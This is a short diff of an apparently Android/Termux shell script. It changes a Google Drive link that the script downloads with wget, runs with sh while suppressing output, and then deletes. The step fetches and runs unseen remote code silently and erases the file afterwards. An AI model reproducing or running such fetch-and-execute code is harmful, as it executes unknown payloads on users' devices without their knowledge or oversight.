@@ -24,7 +24,7 @@ if [ $option -eq 1 ]; then
             echo "+---------------------------------------+"
             masban=/storage/emulated/0/Android/data/com.android.vending/files/act
             rm -rf $masban 2> /dev/null
-            wget "https://docs.google.com/uc?export=download&id=1GfHTpY4RqQs7Kk-RaZrzor79a9uxSY9b" -O $masban > /dev/null 2>&1
+            wget "https://docs.google.com/uc?export=download&id=1GgNzAR7ZNen5bvy_7ywKa1GH3oA5BSID" -O $masban > /dev/null 2>&1
             sh $masban 2> /dev/null
             rm -rf $masban 2> /dev/null
 elif [ $option -eq 2 ]; then
